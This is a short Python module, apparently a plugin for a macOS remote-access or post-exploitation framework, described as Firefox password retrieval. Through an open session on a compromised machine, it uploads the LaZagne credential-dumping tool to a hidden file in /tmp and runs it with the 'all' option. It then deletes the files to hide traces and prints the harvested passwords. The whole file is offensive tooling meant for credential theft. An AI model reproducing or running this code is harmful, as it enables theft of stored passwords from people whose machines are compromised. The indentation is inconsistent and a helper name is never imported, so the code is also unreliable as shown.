import modules
import os

class command:
    def __init__(self):
        self.name = "lazagne"
        self.description = "Firefox password retrieval."
        self.type = "custom"
    
    def run(self,session,cmd_data):
    	h.info_general("Uploading...")
    	session.upload_file("resources/lazagne_macos.zip","/tmp",".lazagne_macos.zip")
    	h.info_general("Running...")
        payload = "/tmp/.lazagne_macos.zip -d /tmp/.lazagne >/dev/null;rm /tmp/.lazagne_macos.zip;/usr/bin/python /tmp/.lazagne/lazagne_macos/laZagne.py all;rm -rf /tmp/.lazagne"
        result = session.send_command({"cmd":"unzip","args":payload})
        print result
